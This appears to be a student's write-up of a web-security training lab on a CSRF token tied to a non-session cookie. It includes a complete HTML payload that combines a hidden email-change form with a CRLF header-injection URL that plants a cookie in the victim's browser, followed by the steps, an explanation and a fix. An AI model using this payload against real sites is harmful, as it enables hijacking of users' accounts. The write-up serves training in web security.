# Lab 5: CSRF Token Tied to Non-Session Cookie
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
csrfKey cookie is separate from session cookie.
Search parameter reflects into Set-Cookie header
allowing CRLF injection to plant cookies.

## Payload
```
<html>
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com">
      <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
    </form>
    <img src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRFKEY%3b%20SameSite=None" 
    onerror="document.forms[0].submit();">
  </body>
</html>
```

## Steps
1. Logged in as wiener → noted csrfKey cookie + csrf token
2. Tested swapping csrfKey+csrf from wiener to carlos → accepted
3. Confirmed csrfKey not tied to session
4. Found search term reflected in Set-Cookie header
5. Built CRLF injection URL to plant csrfKey into victim browser
6. Used img onerror to fire form after cookie planted
7. Delivered to victim → solved

## Why It Works
CRLF characters %0d%0a in search param inject
new headers into response. Plants our csrfKey
cookie into victim browser before form submits.

## Fix
Never reflect user input into response headers.
Tie csrfKey to session. Sanitize all inputs.
